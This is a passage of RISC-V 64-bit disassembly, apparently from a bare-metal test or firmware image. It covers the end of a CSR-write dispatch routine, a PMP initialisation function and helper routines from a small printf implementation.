    80003d38:	d6043783          	ld	a5,-672(s0)
    80003d3c:	f0f43823          	sd	a5,-240(s0)
    80003d40:	f1043783          	ld	a5,-240(s0)
    80003d44:	3d479073          	csrw	0x3d4,a5
    80003d48:	a2e5                	j	80003f30 <csr_write_num+0x5ec>
    80003d4a:	d6043783          	ld	a5,-672(s0)
    80003d4e:	f0f43c23          	sd	a5,-232(s0)
    80003d52:	f1843783          	ld	a5,-232(s0)
    80003d56:	3d579073          	csrw	0x3d5,a5
    80003d5a:	aad9                	j	80003f30 <csr_write_num+0x5ec>
    80003d5c:	d6043783          	ld	a5,-672(s0)
    80003d60:	f2f43023          	sd	a5,-224(s0)
    80003d64:	f2043783          	ld	a5,-224(s0)
    80003d68:	3d679073          	csrw	0x3d6,a5
    80003d6c:	a2d1                	j	80003f30 <csr_write_num+0x5ec>
    80003d6e:	d6043783          	ld	a5,-672(s0)
    80003d72:	f2f43423          	sd	a5,-216(s0)
    80003d76:	f2843783          	ld	a5,-216(s0)
    80003d7a:	3d779073          	csrw	0x3d7,a5
    80003d7e:	aa4d                	j	80003f30 <csr_write_num+0x5ec>
    80003d80:	d6043783          	ld	a5,-672(s0)
    80003d84:	f2f43823          	sd	a5,-208(s0)
    80003d88:	f3043783          	ld	a5,-208(s0)
    80003d8c:	3d879073          	csrw	0x3d8,a5
    80003d90:	a245                	j	80003f30 <csr_write_num+0x5ec>
    80003d92:	d6043783          	ld	a5,-672(s0)
    80003d96:	f2f43c23          	sd	a5,-200(s0)
    80003d9a:	f3843783          	ld	a5,-200(s0)
    80003d9e:	3d979073          	csrw	0x3d9,a5
    80003da2:	a279                	j	80003f30 <csr_write_num+0x5ec>
    80003da4:	d6043783          	ld	a5,-672(s0)
    80003da8:	f4f43023          	sd	a5,-192(s0)
    80003dac:	f4043783          	ld	a5,-192(s0)
    80003db0:	3da79073          	csrw	0x3da,a5
    80003db4:	aab5                	j	80003f30 <csr_write_num+0x5ec>
    80003db6:	d6043783          	ld	a5,-672(s0)
    80003dba:	f4f43423          	sd	a5,-184(s0)
    80003dbe:	f4843783          	ld	a5,-184(s0)
    80003dc2:	3db79073          	csrw	0x3db,a5
    80003dc6:	a2ad                	j	80003f30 <csr_write_num+0x5ec>
    80003dc8:	d6043783          	ld	a5,-672(s0)
    80003dcc:	f4f43823          	sd	a5,-176(s0)
    80003dd0:	f5043783          	ld	a5,-176(s0)
    80003dd4:	3dc79073          	csrw	0x3dc,a5
    80003dd8:	aaa1                	j	80003f30 <csr_write_num+0x5ec>
    80003dda:	d6043783          	ld	a5,-672(s0)
    80003dde:	f4f43c23          	sd	a5,-168(s0)
    80003de2:	f5843783          	ld	a5,-168(s0)
    80003de6:	3dd79073          	csrw	0x3dd,a5
    80003dea:	a299                	j	80003f30 <csr_write_num+0x5ec>
    80003dec:	d6043783          	ld	a5,-672(s0)
    80003df0:	f6f43023          	sd	a5,-160(s0)
    80003df4:	f6043783          	ld	a5,-160(s0)
    80003df8:	3de79073          	csrw	0x3de,a5
    80003dfc:	aa15                	j	80003f30 <csr_write_num+0x5ec>
    80003dfe:	d6043783          	ld	a5,-672(s0)
    80003e02:	f6f43423          	sd	a5,-152(s0)
    80003e06:	f6843783          	ld	a5,-152(s0)
    80003e0a:	3df79073          	csrw	0x3df,a5
    80003e0e:	a20d                	j	80003f30 <csr_write_num+0x5ec>
    80003e10:	d6043783          	ld	a5,-672(s0)
    80003e14:	f6f43823          	sd	a5,-144(s0)
    80003e18:	f7043783          	ld	a5,-144(s0)
    80003e1c:	3e079073          	csrw	0x3e0,a5
    80003e20:	aa01                	j	80003f30 <csr_write_num+0x5ec>
    80003e22:	d6043783          	ld	a5,-672(s0)
    80003e26:	f6f43c23          	sd	a5,-136(s0)
    80003e2a:	f7843783          	ld	a5,-136(s0)
    80003e2e:	3e179073          	csrw	0x3e1,a5
    80003e32:	a8fd                	j	80003f30 <csr_write_num+0x5ec>
    80003e34:	d6043783          	ld	a5,-672(s0)
    80003e38:	f8f43023          	sd	a5,-128(s0)
    80003e3c:	f8043783          	ld	a5,-128(s0)
    80003e40:	3e279073          	csrw	0x3e2,a5
    80003e44:	a0f5                	j	80003f30 <csr_write_num+0x5ec>
    80003e46:	d6043783          	ld	a5,-672(s0)
    80003e4a:	f8f43423          	sd	a5,-120(s0)
    80003e4e:	f8843783          	ld	a5,-120(s0)
    80003e52:	3e379073          	csrw	0x3e3,a5
    80003e56:	a8e9                	j	80003f30 <csr_write_num+0x5ec>
    80003e58:	d6043783          	ld	a5,-672(s0)
    80003e5c:	f8f43823          	sd	a5,-112(s0)
    80003e60:	f9043783          	ld	a5,-112(s0)
    80003e64:	3e479073          	csrw	0x3e4,a5
    80003e68:	a0e1                	j	80003f30 <csr_write_num+0x5ec>
    80003e6a:	d6043783          	ld	a5,-672(s0)
    80003e6e:	f8f43c23          	sd	a5,-104(s0)
    80003e72:	f9843783          	ld	a5,-104(s0)
    80003e76:	3e579073          	csrw	0x3e5,a5
    80003e7a:	a85d                	j	80003f30 <csr_write_num+0x5ec>
    80003e7c:	d6043783          	ld	a5,-672(s0)
    80003e80:	faf43023          	sd	a5,-96(s0)
    80003e84:	fa043783          	ld	a5,-96(s0)
    80003e88:	3e679073          	csrw	0x3e6,a5
    80003e8c:	a055                	j	80003f30 <csr_write_num+0x5ec>
    80003e8e:	d6043783          	ld	a5,-672(s0)
    80003e92:	faf43423          	sd	a5,-88(s0)
    80003e96:	fa843783          	ld	a5,-88(s0)
    80003e9a:	3e779073          	csrw	0x3e7,a5
    80003e9e:	a849                	j	80003f30 <csr_write_num+0x5ec>
    80003ea0:	d6043783          	ld	a5,-672(s0)
    80003ea4:	faf43823          	sd	a5,-80(s0)
    80003ea8:	fb043783          	ld	a5,-80(s0)
    80003eac:	3e879073          	csrw	0x3e8,a5
    80003eb0:	a041                	j	80003f30 <csr_write_num+0x5ec>
    80003eb2:	d6043783          	ld	a5,-672(s0)
    80003eb6:	faf43c23          	sd	a5,-72(s0)
    80003eba:	fb843783          	ld	a5,-72(s0)
    80003ebe:	3e979073          	csrw	0x3e9,a5
    80003ec2:	a0bd                	j	80003f30 <csr_write_num+0x5ec>
    80003ec4:	d6043783          	ld	a5,-672(s0)
    80003ec8:	fcf43023          	sd	a5,-64(s0)
    80003ecc:	fc043783          	ld	a5,-64(s0)
    80003ed0:	3ea79073          	csrw	0x3ea,a5
    80003ed4:	a8b1                	j	80003f30 <csr_write_num+0x5ec>
    80003ed6:	d6043783          	ld	a5,-672(s0)
    80003eda:	fcf43423          	sd	a5,-56(s0)
    80003ede:	fc843783          	ld	a5,-56(s0)
    80003ee2:	3eb79073          	csrw	0x3eb,a5
    80003ee6:	a0a9                	j	80003f30 <csr_write_num+0x5ec>
    80003ee8:	d6043783          	ld	a5,-672(s0)
    80003eec:	fcf43823          	sd	a5,-48(s0)
    80003ef0:	fd043783          	ld	a5,-48(s0)
    80003ef4:	3ec79073          	csrw	0x3ec,a5
    80003ef8:	a825                	j	80003f30 <csr_write_num+0x5ec>
    80003efa:	d6043783          	ld	a5,-672(s0)
    80003efe:	fcf43c23          	sd	a5,-40(s0)
    80003f02:	fd843783          	ld	a5,-40(s0)
    80003f06:	3ed79073          	csrw	0x3ed,a5
    80003f0a:	a01d                	j	80003f30 <csr_write_num+0x5ec>
    80003f0c:	d6043783          	ld	a5,-672(s0)
    80003f10:	fef43023          	sd	a5,-32(s0)
    80003f14:	fe043783          	ld	a5,-32(s0)
    80003f18:	3ee79073          	csrw	0x3ee,a5
    80003f1c:	a811                	j	80003f30 <csr_write_num+0x5ec>
    80003f1e:	d6043783          	ld	a5,-672(s0)
    80003f22:	fef43423          	sd	a5,-24(s0)
    80003f26:	fe843783          	ld	a5,-24(s0)
    80003f2a:	3ef79073          	csrw	0x3ef,a5
    80003f2e:	0001                	nop
    80003f30:	0001                	nop
    80003f32:	29813403          	ld	s0,664(sp)
    80003f36:	2a010113          	addi	sp,sp,672
    80003f3a:	8082                	ret

Disassembly of section .text.init_pmp:

0000000080003f3c <init_pmp>:
    80003f3c:	1101                	addi	sp,sp,-32
    80003f3e:	ec06                	sd	ra,24(sp)
    80003f40:	e822                	sd	s0,16(sp)
    80003f42:	1000                	addi	s0,sp,32
    80003f44:	fe042623          	sw	zero,-20(s0)
    80003f48:	a839                	j	80003f66 <init_pmp+0x2a>
    80003f4a:	fec42783          	lw	a5,-20(s0)
    80003f4e:	3b07879b          	addiw	a5,a5,944
    80003f52:	2781                	sext.w	a5,a5
    80003f54:	55fd                	li	a1,-1
    80003f56:	853e                	mv	a0,a5
    80003f58:	9edff0ef          	jal	80003944 <csr_write_num>
    80003f5c:	fec42783          	lw	a5,-20(s0)
    80003f60:	2785                	addiw	a5,a5,1
    80003f62:	fef42623          	sw	a5,-20(s0)
    80003f66:	fec42783          	lw	a5,-20(s0)
    80003f6a:	0007871b          	sext.w	a4,a5
    80003f6e:	47bd                	li	a5,15
    80003f70:	fce7dde3          	bge	a5,a4,80003f4a <init_pmp+0xe>
    80003f74:	47fd                	li	a5,31
    80003f76:	17e2                	slli	a5,a5,0x38
    80003f78:	3a279073          	csrw	pmpcfg2,a5
    80003f7c:	12000073          	sfence.vma
    80003f80:	0001                	nop
    80003f82:	60e2                	ld	ra,24(sp)
    80003f84:	6442                	ld	s0,16(sp)
    80003f86:	6105                	addi	sp,sp,32
    80003f88:	8082                	ret

Disassembly of section .text._out_null:

0000000080003f8a <_out_null>:
    80003f8a:	7179                	addi	sp,sp,-48
    80003f8c:	f422                	sd	s0,40(sp)
    80003f8e:	1800                	addi	s0,sp,48
    80003f90:	87aa                	mv	a5,a0
    80003f92:	feb43023          	sd	a1,-32(s0)
    80003f96:	fcc43c23          	sd	a2,-40(s0)
    80003f9a:	fcd43823          	sd	a3,-48(s0)
    80003f9e:	fef407a3          	sb	a5,-17(s0)
    80003fa2:	0001                	nop
    80003fa4:	7422                	ld	s0,40(sp)
    80003fa6:	6145                	addi	sp,sp,48
    80003fa8:	8082                	ret

Disassembly of section .text._out_char:

0000000080003faa <_out_char>:
    80003faa:	7179                	addi	sp,sp,-48
    80003fac:	f406                	sd	ra,40(sp)
    80003fae:	f022                	sd	s0,32(sp)
    80003fb0:	1800                	addi	s0,sp,48
    80003fb2:	87aa                	mv	a5,a0
    80003fb4:	feb43023          	sd	a1,-32(s0)
    80003fb8:	fcc43c23          	sd	a2,-40(s0)
    80003fbc:	fcd43823          	sd	a3,-48(s0)
    80003fc0:	fef407a3          	sb	a5,-17(s0)
    80003fc4:	fef44783          	lbu	a5,-17(s0)
    80003fc8:	0ff7f793          	zext.b	a5,a5
    80003fcc:	c791                	beqz	a5,80003fd8 <_out_char+0x2e>
    80003fce:	fef44783          	lbu	a5,-17(s0)
    80003fd2:	853e                	mv	a0,a5
    80003fd4:	841ff0ef          	jal	80003814 <_putc>
    80003fd8:	0001                	nop
    80003fda:	70a2                	ld	ra,40(sp)
    80003fdc:	7402                	ld	s0,32(sp)
    80003fde:	6145                	addi	sp,sp,48
    80003fe0:	8082                	ret

Disassembly of section .text._strnlen_s:

0000000080003fe2 <_strnlen_s>:
    80003fe2:	7179                	addi	sp,sp,-48
    80003fe4:	f422                	sd	s0,40(sp)
    80003fe6:	1800                	addi	s0,sp,48
    80003fe8:	fca43c23          	sd	a0,-40(s0)
    80003fec:	fcb43823          	sd	a1,-48(s0)
    80003ff0:	fd843783          	ld	a5,-40(s0)
    80003ff4:	fef43423          	sd	a5,-24(s0)
    80003ff8:	a031                	j	80004004 <_strnlen_s+0x22>
    80003ffa:	fe843783          	ld	a5,-24(s0)
    80003ffe:	0785                	addi	a5,a5,1
    80004000:	fef43423          	sd	a5,-24(s0)
    80004004:	fe843783          	ld	a5,-24(s0)
    80004008:	0007c783          	lbu	a5,0(a5)
    8000400c:	cb81                	beqz	a5,8000401c <_strnlen_s+0x3a>
    8000400e:	fd043783          	ld	a5,-48(s0)
    80004012:	fff78713          	addi	a4,a5,-1
    80004016:	fce43823          	sd	a4,-48(s0)
    8000401a:	f3e5                	bnez	a5,80003ffa <_strnlen_s+0x18>
    8000401c:	fe843703          	ld	a4,-24(s0)
    80004020:	fd843783          	ld	a5,-40(s0)
    80004024:	40f707b3          	sub	a5,a4,a5
    80004028:	2781                	sext.w	a5,a5
    8000402a:	853e                	mv	a0,a5
    8000402c:	7422                	ld	s0,40(sp)
    8000402e:	6145                	addi	sp,sp,48
    80004030:	8082                	ret

Disassembly of section .text._is_digit:

0000000080004032 <_is_digit>:
    80004032:	1101                	addi	sp,sp,-32
    80004034:	ec22                	sd	s0,24(sp)
    80004036:	1000                	addi	s0,sp,32
    80004038:	87aa                	mv	a5,a0
    8000403a:	fef407a3          	sb	a5,-17(s0)
    8000403e:	fef44783          	lbu	a5,-17(s0)
    80004042:	0ff7f713          	zext.b	a4,a5
    80004046:	02f00793          	li	a5,47
    8000404a:	00e7fc63          	bgeu	a5,a4,80004062 <_is_digit+0x30>
    8000404e:	fef44783          	lbu	a5,-17(s0)
    80004052:	0ff7f713          	zext.b	a4,a5
    80004056:	03900793          	li	a5,57
    8000405a:	00e7e463          	bltu	a5,a4,80004062 <_is_digit+0x30>
    8000405e:	4785                	li	a5,1
    80004060:	a011                	j	80004064 <_is_digit+0x32>
    80004062:	4781                	li	a5,0
    80004064:	8b85                	andi	a5,a5,1
    80004066:	0ff7f793          	zext.b	a5,a5
    8000406a:	853e                	mv	a0,a5
    8000406c:	6462                	ld	s0,24(sp)
    8000406e:	6105                	addi	sp,sp,32
    80004070:	8082                	ret

Disassembly of section .text._atoi:

0000000080004072 <_atoi>:
    80004072:	7179                	addi	sp,sp,-48
    80004074:	f406                	sd	ra,40(sp)
    80004076:	f022                	sd	s0,32(sp)
    80004078:	1800                	addi	s0,sp,48
    8000407a:	fca43c23          	sd	a0,-40(s0)
    8000407e:	fe042623          	sw	zero,-20(s0)
    80004082:	a82d                	j	800040bc <_atoi+0x4a>
    80004084:	fec42783          	lw	a5,-20(s0)
    80004088:	873e                	mv	a4,a5
    8000408a:	87ba                	mv	a5,a4
    8000408c:	0027979b          	slliw	a5,a5,0x2
    80004090:	9fb9                	addw	a5,a5,a4
    80004092:	0017979b          	slliw	a5,a5,0x1
    80004096:	0007871b          	sext.w	a4,a5
    8000409a:	fd843783          	ld	a5,-40(s0)
    8000409e:	639c                	ld	a5,0(a5)
    800040a0:	00178613          	addi	a2,a5,1
    800040a4:	fd843683          	ld	a3,-40(s0)
    800040a8:	e290                	sd	a2,0(a3)
    800040aa:	0007c783          	lbu	a5,0(a5)
    800040ae:	2781                	sext.w	a5,a5
    800040b0:	9fb9                	addw	a5,a5,a4
    800040b2:	2781                	sext.w	a5,a5
    800040b4:	fd07879b          	addiw	a5,a5,-48
    800040b8:	fef42623          	sw	a5,-20(s0)
    800040bc:	fd843783          	ld	a5,-40(s0)
    800040c0:	639c                	ld	a5,0(a5)
    800040c2:	0007c783          	lbu	a5,0(a5)
    800040c6:	853e                	mv	a0,a5
    800040c8:	f6bff0ef          	jal	80004032 <_is_digit>
    800040cc:	87aa                	mv	a5,a0
    800040ce:	fbdd                	bnez	a5,80004084 <_atoi+0x12>
    800040d0:	fec42783          	lw	a5,-20(s0)
    800040d4:	853e                	mv	a0,a5
    800040d6:	70a2                	ld	ra,40(sp)
    800040d8:	7402                	ld	s0,32(sp)
    800040da:	6145                	addi	sp,sp,48
    800040dc:	8082                	ret

Disassembly of section .text._out_rev:

00000000800040de <_out_rev>:
    800040de:	711d                	addi	sp,sp,-96
    800040e0:	ec86                	sd	ra,88(sp)
    800040e2:	e8a2                	sd	s0,80(sp)
    800040e4:	1080                	addi	s0,sp,96
    800040e6:	fca43c23          	sd	a0,-40(s0)
    800040ea:	fcb43823          	sd	a1,-48(s0)
    800040ee:	fcc43423          	sd	a2,-56(s0)
    800040f2:	fcd43023          	sd	a3,-64(s0)
    800040f6:	fae43c23          	sd	a4,-72(s0)
    800040fa:	faf43823          	sd	a5,-80(s0)
    800040fe:	87c2                	mv	a5,a6
    80004100:	8746                	mv	a4,a7
    80004102:	faf42623          	sw	a5,-84(s0)
    80004106:	87ba                	mv	a5,a4
    80004108:	faf42423          	sw	a5,-88(s0)
    8000410c:	fc843783          	ld	a5,-56(s0)
    80004110:	fef43023          	sd	a5,-32(s0)
    80004114:	fa842783          	lw	a5,-88(s0)
    80004118:	8b89                	andi	a5,a5,2
    8000411a:	2781                	sext.w	a5,a5
    8000411c:	e3c9                	bnez	a5,8000419e <_out_rev+0xc0>
    8000411e:	fa842783          	lw	a5,-88(s0)
    80004122:	8b85                	andi	a5,a5,1
    80004124:	2781                	sext.w	a5,a5
    80004126:	efa5                	bnez	a5,8000419e <_out_rev+0xc0>
    80004128:	fb043783          	ld	a5,-80(s0)
    8000412c:	fef43423          	sd	a5,-24(s0)
    80004130:	a035                	j	8000415c <_out_rev+0x7e>
    80004132:	fc843783          	ld	a5,-56(s0)
    80004136:	00178713          	addi	a4,a5,1
    8000413a:	fce43423          	sd	a4,-56(s0)
    8000413e:	fd843703          	ld	a4,-40(s0)
    80004142:	fc043683          	ld	a3,-64(s0)
    80004146:	863e                	mv	a2,a5
    80004148:	fd043583          	ld	a1,-48(s0)
    8000414c:	02000513          	li	a0,32
    80004150:	9702                	jalr	a4
    80004152:	fe843783          	ld	a5,-24(s0)
    80004156:	0785                	addi	a5,a5,1
    80004158:	fef43423          	sd	a5,-24(s0)
    8000415c:	fac46783          	lwu	a5,-84(s0)
    80004160:	fe843703          	ld	a4,-24(s0)
    80004164:	fcf767e3          	bltu	a4,a5,80004132 <_out_rev+0x54>
    80004168:	a81d                	j	8000419e <_out_rev+0xc0>
    8000416a:	fb043783          	ld	a5,-80(s0)
    8000416e:	17fd                	addi	a5,a5,-1
    80004170:	faf43823          	sd	a5,-80(s0)
    80004174:	fb843703          	ld	a4,-72(s0)
    80004178:	fb043783          	ld	a5,-80(s0)
    8000417c:	97ba                	add	a5,a5,a4
    8000417e:	0007c503          	lbu	a0,0(a5)
    80004182:	fc843783          	ld	a5,-56(s0)
    80004186:	00178713          	addi	a4,a5,1
    8000418a:	fce43423          	sd	a4,-56(s0)
    8000418e:	fd843703          	ld	a4,-40(s0)
    80004192:	fc043683          	ld	a3,-64(s0)
    80004196:	863e                	mv	a2,a5
    80004198:	fd043583          	ld	a1,-48(s0)
    8000419c:	9702                	jalr	a4
    8000419e:	fb043783          	ld	a5,-80(s0)
    800041a2:	f7e1                	bnez	a5,8000416a <_out_rev+0x8c>
    800041a4:	fa842783          	lw	a5,-88(s0)
    800041a8:	8b89                	andi	a5,a5,2
    800041aa:	2781                	sext.w	a5,a5
    800041ac:	cb9d                	beqz	a5,800041e2 <_out_rev+0x104>
    800041ae:	a00d                	j	800041d0 <_out_rev+0xf2>
    800041b0:	fc843783          	ld	a5,-56(s0)
    800041b4:	00178713          	addi	a4,a5,1
    800041b8:	fce43423          	sd	a4,-56(s0)
    800041bc:	fd843703          	ld	a4,-40(s0)
    800041c0:	fc043683          	ld	a3,-64(s0)
    800041c4:	863e                	mv	a2,a5
    800041c6:	fd043583          	ld	a1,-48(s0)
    800041ca:	02000513          	li	a0,32
    800041ce:	9702                	jalr	a4
    800041d0:	fc843703          	ld	a4,-56(s0)
    800041d4:	fe043783          	ld	a5,-32(s0)
    800041d8:	8f1d                	sub	a4,a4,a5
    800041da:	fac46783          	lwu	a5,-84(s0)
    800041de:	fcf769e3          	bltu	a4,a5,800041b0 <_out_rev+0xd2>
    800041e2:	fc843783          	ld	a5,-56(s0)
    800041e6:	853e                	mv	a0,a5
    800041e8:	60e6                	ld	ra,88(sp)
    800041ea:	6446                	ld	s0,80(sp)
    800041ec:	6125                	addi	sp,sp,96
    800041ee:	8082                	ret

Disassembly of section .text._ntoa_format:

00000000800041f0 <_ntoa_format>:
    800041f0:	715d                	addi	sp,sp,-80
    800041f2:	e486                	sd	ra,72(sp)
    800041f4:	e0a2                	sd	s0,64(sp)
    800041f6:	0880                	addi	s0,sp,80
    800041f8:	fea43423          	sd	a0,-24(s0)
    800041fc:	feb43023          	sd	a1,-32(s0)
    80004200:	fcc43c23          	sd	a2,-40(s0)
    80004204:	fcd43823          	sd	a3,-48(s0)
    80004208:	fce43423          	sd	a4,-56(s0)
    8000420c:	fcf43023          	sd	a5,-64(s0)
    80004210:	87c2                	mv	a5,a6
    80004212:	8746                	mv	a4,a7
    80004214:	faf40fa3          	sb	a5,-65(s0)
    80004218:	87ba                	mv	a5,a4
    8000421a:	faf42c23          	sw	a5,-72(s0)
    8000421e:	481c                	lw	a5,16(s0)
    80004220:	8b89                	andi	a5,a5,2
    80004222:	2781                	sext.w	a5,a5
    80004224:	ebd1                	bnez	a5,800042b8 <_ntoa_format+0xc8>
    80004226:	441c                	lw	a5,8(s0)
    80004228:	2781                	sext.w	a5,a5
    8000422a:	cf9d                	beqz	a5,80004268 <_ntoa_format+0x78>
    8000422c:	481c                	lw	a5,16(s0)
    8000422e:	8b85                	andi	a5,a5,1
    80004230:	2781                	sext.w	a5,a5
    80004232:	cb9d                	beqz	a5,80004268 <_ntoa_format+0x78>
    80004234:	fbf44783          	lbu	a5,-65(s0)
    80004238:	0ff7f793          	zext.b	a5,a5
    8000423c:	e789                	bnez	a5,80004246 <_ntoa_format+0x56>
    8000423e:	481c                	lw	a5,16(s0)
    80004240:	8bb1                	andi	a5,a5,12
    80004242:	2781                	sext.w	a5,a5
    80004244:	c395                	beqz	a5,80004268 <_ntoa_format+0x78>
    80004246:	441c                	lw	a5,8(s0)
    80004248:	37fd                	addiw	a5,a5,-1
    8000424a:	c41c                	sw	a5,8(s0)
    8000424c:	a831                	j	80004268 <_ntoa_format+0x78>
    8000424e:	fc043783          	ld	a5,-64(s0)
    80004252:	00178713          	addi	a4,a5,1
    80004256:	fce43023          	sd	a4,-64(s0)
    8000425a:	fc843703          	ld	a4,-56(s0)
    8000425e:	97ba                	add	a5,a5,a4
    80004260:	03000713          	li	a4,48
    80004264:	00e78023          	sb	a4,0(a5)
    80004268:	00046783          	lwu	a5,0(s0)
    8000426c:	fc043703          	ld	a4,-64(s0)
    80004270:	02f77563          	bgeu	a4,a5,8000429a <_ntoa_format+0xaa>
    80004274:	fc043703          	ld	a4,-64(s0)
    80004278:	47fd                	li	a5,31
    8000427a:	fce7fae3          	bgeu	a5,a4,8000424e <_ntoa_format+0x5e>
    8000427e:	a831                	j	8000429a <_ntoa_format+0xaa>
    80004280:	fc043783          	ld	a5,-64(s0)
    80004284:	00178713          	addi	a4,a5,1
    80004288:	fce43023          	sd	a4,-64(s0)
    8000428c:	fc843703          	ld	a4,-56(s0)
    80004290:	97ba                	add	a5,a5,a4
    80004292:	03000713          	li	a4,48
    80004296:	00e78023          	sb	a4,0(a5)
    8000429a:	481c                	lw	a5,16(s0)
    8000429c:	8b85                	andi	a5,a5,1
    8000429e:	2781                	sext.w	a5,a5
    800042a0:	cf81                	beqz	a5,800042b8 <_ntoa_format+0xc8>
    800042a2:	00846783          	lwu	a5,8(s0)
    800042a6:	fc043703          	ld	a4,-64(s0)
    800042aa:	00f77763          	bgeu	a4,a5,800042b8 <_ntoa_format+0xc8>
    800042ae:	fc043703          	ld	a4,-64(s0)
    800042b2:	47fd                	li	a5,31
    800042b4:	fce7f6e3          	bgeu	a5,a4,80004280 <_ntoa_format+0x90>
    800042b8:	481c                	lw	a5,16(s0)
    800042ba:	8bc1                	andi	a5,a5,16
    800042bc:	2781                	sext.w	a5,a5
    800042be:	12078363          	beqz	a5,800043e4 <_ntoa_format+0x1f4>
    800042c2:	481c                	lw	a5,16(s0)
    800042c4:	4007f793          	andi	a5,a5,1024
    800042c8:	2781                	sext.w	a5,a5
    800042ca:	e7a1                	bnez	a5,80004312 <_ntoa_format+0x122>
    800042cc:	fc043783          	ld	a5,-64(s0)
    800042d0:	c3a9                	beqz	a5,80004312 <_ntoa_format+0x122>
    800042d2:	00046783          	lwu	a5,0(s0)
    800042d6:	fc043703          	ld	a4,-64(s0)
    800042da:	00f70863          	beq	a4,a5,800042ea <_ntoa_format+0xfa>
    800042de:	00846783          	lwu	a5,8(s0)
    800042e2:	fc043703          	ld	a4,-64(s0)
    800042e6:	02f71663          	bne	a4,a5,80004312 <_ntoa_format+0x122>
    800042ea:	fc043783          	ld	a5,-64(s0)
    800042ee:	17fd                	addi	a5,a5,-1
    800042f0:	fcf43023          	sd	a5,-64(s0)
    800042f4:	fc043783          	ld	a5,-64(s0)
    800042f8:	cf89                	beqz	a5,80004312 <_ntoa_format+0x122>
    800042fa:	fb842783          	lw	a5,-72(s0)
    800042fe:	0007871b          	sext.w	a4,a5
    80004302:	47c1                	li	a5,16
    80004304:	00f71763          	bne	a4,a5,80004312 <_ntoa_format+0x122>
    80004308:	fc043783          	ld	a5,-64(s0)
    8000430c:	17fd                	addi	a5,a5,-1
    8000430e:	fcf43023          	sd	a5,-64(s0)
    80004312:	fb842783          	lw	a5,-72(s0)
    80004316:	0007871b          	sext.w	a4,a5
    8000431a:	47c1                	li	a5,16
    8000431c:	02f71a63          	bne	a4,a5,80004350 <_ntoa_format+0x160>
    80004320:	481c                	lw	a5,16(s0)
    80004322:	0207f793          	andi	a5,a5,32
    80004326:	2781                	sext.w	a5,a5
    80004328:	e785                	bnez	a5,80004350 <_ntoa_format+0x160>
    8000432a:	fc043703          	ld	a4,-64(s0)
    8000432e:	47fd                	li	a5,31
    80004330:	02e7e063          	bltu	a5,a4,80004350 <_ntoa_format+0x160>
    80004334:	fc043783          	ld	a5,-64(s0)
    80004338:	00178713          	addi	a4,a5,1
    8000433c:	fce43023          	sd	a4,-64(s0)
    80004340:	fc843703          	ld	a4,-56(s0)
    80004344:	97ba                	add	a5,a5,a4
    80004346:	07800713          	li	a4,120
    8000434a:	00e78023          	sb	a4,0(a5)
    8000434e:	a88d                	j	800043c0 <_ntoa_format+0x1d0>
    80004350:	fb842783          	lw	a5,-72(s0)
    80004354:	0007871b          	sext.w	a4,a5
    80004358:	47c1                	li	a5,16
    8000435a:	02f71a63          	bne	a4,a5,8000438e <_ntoa_format+0x19e>
    8000435e:	481c                	lw	a5,16(s0)
    80004360:	0207f793          	andi	a5,a5,32
    80004364:	2781                	sext.w	a5,a5
    80004366:	c785                	beqz	a5,8000438e <_ntoa_format+0x19e>
    80004368:	fc043703          	ld	a4,-64(s0)
    8000436c:	47fd                	li	a5,31
    8000436e:	02e7e063          	bltu	a5,a4,8000438e <_ntoa_format+0x19e>
    80004372:	fc043783          	ld	a5,-64(s0)
    80004376:	00178713          	addi	a4,a5,1
    8000437a:	fce43023          	sd	a4,-64(s0)
    8000437e:	fc843703          	ld	a4,-56(s0)
    80004382:	97ba                	add	a5,a5,a4
    80004384:	05800713          	li	a4,88
    80004388:	00e78023          	sb	a4,0(a5)
    8000438c:	a815                	j	800043c0 <_ntoa_format+0x1d0>
    8000438e:	fb842783          	lw	a5,-72(s0)
    80004392:	0007871b          	sext.w	a4,a5
    80004396:	4789                	li	a5,2
    80004398:	02f71463          	bne	a4,a5,800043c0 <_ntoa_format+0x1d0>
    8000439c:	fc043703          	ld	a4,-64(s0)
    800043a0:	47fd                	li	a5,31
    800043a2:	00e7ef63          	bltu	a5,a4,800043c0 <_ntoa_format+0x1d0>
    800043a6:	fc043783          	ld	a5,-64(s0)
    800043aa:	00178713          	addi	a4,a5,1
    800043ae:	fce43023          	sd	a4,-64(s0)
    800043b2:	fc843703          	ld	a4,-56(s0)
    800043b6:	97ba                	add	a5,a5,a4
    800043b8:	06200713          	li	a4,98
    800043bc:	00e78023          	sb	a4,0(a5)
    800043c0:	fc043703          	ld	a4,-64(s0)
    800043c4:	47fd                	li	a5,31
    800043c6:	00e7ef63          	bltu	a5,a4,800043e4 <_ntoa_format+0x1f4>
    800043ca:	fc043783          	ld	a5,-64(s0)
    800043ce:	00178713          	addi	a4,a5,1
    800043d2:	fce43023          	sd	a4,-64(s0)
    800043d6:	fc843703          	ld	a4,-56(s0)
    800043da:	97ba                	add	a5,a5,a4
    800043dc:	03000713          	li	a4,48
    800043e0:	00e78023          	sb	a4,0(a5)
    800043e4:	fc043703          	ld	a4,-64(s0)
    800043e8:	47fd                	li	a5,31
    800043ea:	06e7e863          	bltu	a5,a4,8000445a <_ntoa_format+0x26a>
    800043ee:	fbf44783          	lbu	a5,-65(s0)
    800043f2:	0ff7f793          	zext.b	a5,a5
    800043f6:	cf99                	beqz	a5,80004414 <_ntoa_format+0x224>
    800043f8:	fc043783          	ld	a5,-64(s0)
    800043fc:	00178713          	addi	a4,a5,1
    80004400:	fce43023          	sd	a4,-64(s0)
    80004404:	fc843703          	ld	a4,-56(s0)
    80004408:	97ba                	add	a5,a5,a4
    8000440a:	02d00713          	li	a4,45
    8000440e:	00e78023          	sb	a4,0(a5)
    80004412:	a0a1                	j	8000445a <_ntoa_format+0x26a>
    80004414:	481c                	lw	a5,16(s0)
    80004416:	8b91                	andi	a5,a5,4
    80004418:	2781                	sext.w	a5,a5
    8000441a:	cf99                	beqz	a5,80004438 <_ntoa_format+0x248>
    8000441c:	fc043783          	ld	a5,-64(s0)
    80004420:	00178713          	addi	a4,a5,1
    80004424:	fce43023          	sd	a4,-64(s0)
    80004428:	fc843703          	ld	a4,-56(s0)
    8000442c:	97ba                	add	a5,a5,a4
    8000442e:	02b00713          	li	a4,43
    80004432:	00e78023          	sb	a4,0(a5)
    80004436:	a015                	j	8000445a <_ntoa_format+0x26a>
    80004438:	481c                	lw	a5,16(s0)
    8000443a:	8ba1                	andi	a5,a5,8
    8000443c:	2781                	sext.w	a5,a5
    8000443e:	cf91                	beqz	a5,8000445a <_ntoa_format+0x26a>
    80004440:	fc043783          	ld	a5,-64(s0)
    80004444:	00178713          	addi	a4,a5,1
